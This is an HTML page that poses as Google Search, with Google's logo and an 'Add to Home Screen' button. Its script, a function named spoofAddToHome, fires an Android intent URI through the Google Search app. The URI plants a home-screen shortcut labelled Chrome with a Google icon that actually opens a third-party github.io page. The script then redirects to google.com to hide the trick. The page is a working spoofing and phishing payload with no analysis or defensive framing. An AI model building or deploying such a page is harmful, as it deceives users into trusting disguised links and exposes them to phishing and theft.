<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google Search</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body, html { margin:0; padding:0; height:100vh; background:#fff; font-family:'Segoe UI',Arial,sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; color:#333; }
    .logo { width:120px; margin-bottom:30px; }
    h1 { font-size:28px; margin:20px 0; color:#4285f4; }
    p { color:#666; font-size:18px; max-width:500px; line-height:1.5; }
    .btn {
      background:#4285f4; color:white; padding:16px 32px; font-size:18px; border:none; border-radius:50px; cursor:pointer; margin:20px;
      box-shadow:0 4px 15px rgba(66,133,244,0.4); transition:0.2s;
    }
    .btn:hover { background:#3367d6; transform:translateY(-2px); }
    .loader { width:60px; height:60px; border:6px solid #f0f0f0; border-top:6px solid #4285f4; border-radius:50%; animation:spin 1s linear infinite; margin:30px auto; }
    @keyframes spin { to { transform:rotate(360deg); } }
  </style>
</head>
<body>

  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
  <h1>Google Search</h1>
  <p>Click below to add Google Search to your home screen for faster access</p>
  <button class="btn" onclick="spoofAddToHome()">Add to Home Screen</button>
  <div class="loader" id="loader" style="display:none;"></div>

  <script>
    function spoofAddToHome() {
      const loader = document.getElementById('loader');
      loader.style.display = 'block';

      // 1. TRIGGER ADD TO HOME SCREEN SPOOF VIA INTENT SCHEME
      location.href = 'intent://search.app.goo.gl/?link=https://www.google.com/hsi?name%3DChrome%26icon%3Dhttps://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png%26ve%3D145828%26hv%3D1%26dest%3D1%26source%3Dhomescreen_shortcut%26query%3Dhttps%3A%2F%2Frmicrosoft.github.io%23Intent;scheme%3Dhttps;package%3Dcom.google.android.googlequicksearchbox;end&apn=com.google.android.googlequicksearchbox#Intent;package=com.google.android.gms;scheme=https;end;';

      // 2. REDIRECT KE GOOGLE.COM (SPOOF ORIGIN)
      setTimeout(() => {
        location.href = "https://www.google.com";
      }, 1500);
    }
  </script>

</body>
</html>
